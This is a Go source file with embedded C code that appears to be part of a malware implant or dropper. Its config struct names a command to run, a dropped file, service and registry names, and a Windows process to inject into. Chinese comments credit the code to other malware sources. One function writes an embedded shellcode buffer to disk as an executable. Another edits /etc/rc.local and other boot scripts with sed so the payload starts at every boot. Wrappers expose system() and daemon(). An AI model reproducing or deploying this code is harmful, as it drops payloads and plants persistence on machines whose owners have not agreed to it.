package cpack

/*

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include "ShellCode.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include "xxs.h"
#include <limits.h>
struct FALLEN_DATA
{
	unsigned int finder;
	char xxs[1000];			//运行命令
	char filename[255];		//释放的文件名
	char service[255];		//k的服务名
	char Registry[255];		//k的注册表名
	char winProcess[255];	//k的win进程名
	char linuxProcess[255]; //k的linux进程名
	char wininj[100];		//注入的win进程
	char SerName[100];		//服务名称
	char Serdisplay[128];	//显示名称
	char Serdesc[256];		//服务描述
}
fallen_data =
{
	0xF9E28F8D,
	"xxs",
	"filename",
	"123:456",
	"123",
	"abc.exe",
	"abc",
	"wps.exe",
	"fuwmc",
	"xiansmc",
	"fuwumiaosu"
};


char *xxs =fallen_data.xxs;
//char Rtime[1000];//自定义复活时间
char *filename =fallen_data.filename;//释放文件名

char *linuxProcess =fallen_data.linuxProcess;

void Releasefiles(char sfmul[PATH_MAX])
{
	int fp = open(sfmul, O_RDWR|O_CREAT,0755);
	write (fp, m_MyShellCodeFileBuf, m_MyShellCodeFileSize);
	close (fp);
}
//////////直接引用台风源码//我比较懒一点
////////////这个是飞鹰公布的源码，一看就不全，下个版本采用服务启动
void autoboot(char *command)
{
    char cmd[100];
    char pwd[256];
    getcwd(pwd,sizeof(pwd));
    sprintf( cmd,"sed -i -e '/exit/d' /etc/rc.local");
    system ( cmd );
    sprintf( cmd,"sed -i -e '/^\r\n|\r|\n$/d' /etc/rc.local");
    system ( cmd );
    sprintf( cmd,"sed -i -e '%s/%s/d' /etc/rc.local",pwd,command);
    system ( cmd );
    sprintf( cmd,"sed -i -e '2 i\%s/%s' /etc/rc.local",pwd,command);
    system ( cmd );
    sprintf( cmd,"sed -i -e '2 i\%s/%s start' /etc/rc.d/rc.local",pwd,command);
    system ( cmd );
    sprintf( cmd,"sed -i -e '2 i\%s/%s start' /etc/init.d/boot.local",pwd,command);
    system ( cmd );
}

*/
import "C"
var Xxs = C.GoString(C.xxs)
var Filename = C.GoString(C.filename)
var LinuxProcess = C.GoString(C.linuxProcess)
func Autoboot (a string) {
	C.autoboot(C.CString(a))
}

func Releasefiles (a string) {
	C.Releasefiles(C.CString(a))
}

func CsExistProcess (a string) C._Bool{
	return C.IsExistProcess(C.CString(a))//临时错误
}


func System (a string){
	C.system(C.CString(a))
}

func Daemon (){
	C.daemon(0,0)
}





